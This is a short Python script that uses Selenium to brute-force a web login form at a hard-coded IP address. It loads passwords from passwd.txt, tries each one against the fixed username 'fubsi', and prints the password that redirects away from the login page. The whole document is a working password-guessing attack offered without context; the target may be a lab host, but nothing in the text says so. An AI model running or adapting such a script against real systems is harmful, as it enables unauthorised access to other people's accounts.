from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
import time

s = Service(executable_path="chromedriver.exe")

driver = webdriver.Chrome(service=s)

website = "http://141.87.60.46:5000/login"

driver.get(website)

titles = ""
passwords = []
with open("passwd.txt") as f:
    for line in f:
        passwords.append(line.strip())

i = 0

for password in passwords:
    print (f"Trying password: {password}")

    res = driver.find_elements(By.CLASS_NAME, "form-control")
    but = driver.find_element(By.CLASS_NAME, "btn")

    res[0].clear()
    res[0].send_keys("fubsi")
    res[1].clear()
    res[1].send_keys(password)

    

    but.click()
    time.sleep(0.1)

    print(driver.title)

    if driver.current_url != website:
        print(f"The Correct Password is '{password}'")



driver.quit()